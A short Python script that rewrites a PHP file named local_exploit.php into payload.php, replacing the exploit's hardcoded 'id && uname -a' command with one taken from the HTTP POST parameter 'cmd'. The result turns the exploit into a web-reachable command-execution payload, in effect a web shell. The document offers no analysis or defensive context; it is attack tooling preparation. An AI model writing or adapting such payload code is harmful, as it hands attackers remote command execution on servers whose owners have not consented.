import sys

with open('../local_exploit.php', 'rb') as f:
    content = f.read().decode('utf-8', errors='ignore')

lines = content.split('\n')
if lines[0].startswith('#!'): lines = lines[1:]
if lines[0].startswith('<?php'): lines = lines[1:]
content = '\n'.join(lines)

content = content.replace('public function run() {', 'public function run($cmd) {')
# Comment out the old hardcoded command
content = content.replace('$cmd = "id && uname -a";', '// $cmd = "id && uname -a";') 
content = content.replace('(new Exploit)->run();', '(new Exploit)->run($_POST["cmd"] ?? "id");')

with open('payload.php', 'wb') as f:
    f.write(content.encode('utf-8'))
print("Fixed payload.php")
